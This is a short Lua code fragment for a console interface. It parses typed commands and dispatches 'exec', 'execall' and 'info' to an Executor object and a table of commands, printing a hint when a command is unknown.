-- ============================================================
-- CONSOLE INTERFACE
-- ============================================================

local function parseCommand(input)
    local parts = {}
    for part in string.gmatch(input, "%S+") do
        table.insert(parts, part)
    end
    return parts
end

local function processCommand(input)
    if not input or input == "" then return end
    
    local parts = parseCommand(input)
    local cmd = parts[1]:lower()
    
    if cmd == "exec" and #parts >= 3 then
        local remoteId = parts[2]
        local code = table.concat(parts, " ", 3)
        Executor:execute(code, tonumber(remoteId))
    elseif cmd == "execall" and #parts >= 2 then
        local code = table.concat(parts, " ", 2)
        Executor:executeAll(code)
    elseif cmd == "info" and #parts >= 2 then
        Commands.info(parts[2])
    elseif Commands[cmd] then
        Commands[cmd]()
    else
        print("[CMD] Unknown command: " .. cmd)
        print("[CMD] Type 'help' for available commands")
    end
end

